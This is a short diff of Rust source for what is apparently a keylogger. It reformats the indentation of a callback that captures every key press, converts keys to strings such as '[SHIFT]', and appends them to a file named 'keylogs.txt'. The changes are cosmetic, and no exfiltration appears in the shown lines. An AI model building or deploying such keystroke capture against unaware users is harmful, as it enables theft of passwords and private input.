@@ -10,12 +10,12 @@ pub fn recording() {
 fn callback(event: Event) {
     if let EventType::KeyPress(key) = event.event_type {
         let mut file = OpenOptions::new()
-                                        .read(true)
-                                        .write(true)
-                                        .append(true)
-                                        .create(true)
-                                        .open("keylogs.txt")
-                                        .unwrap();
+            .read(true)
+            .write(true)
+            .append(true)
+            .create(true)
+            .open("keylogs.txt")
+            .unwrap();
         if let Some(key_char) = key_to_string(key) {
             file.write_all(key_char.as_bytes()).unwrap();
         }
@@ -36,7 +36,7 @@ fn key_to_string(key: Key) -> Option<String> {
         Key::ShiftLeft | Key::ShiftRight => "[SHIFT]".to_string(),
         Key::Alt => "[ALT]".to_string(),
         Key::Tab => "[TAB]".to_string(),
-        _ => cleaned_key, 
+        _ => cleaned_key,
     };
 
     Some(final_str)
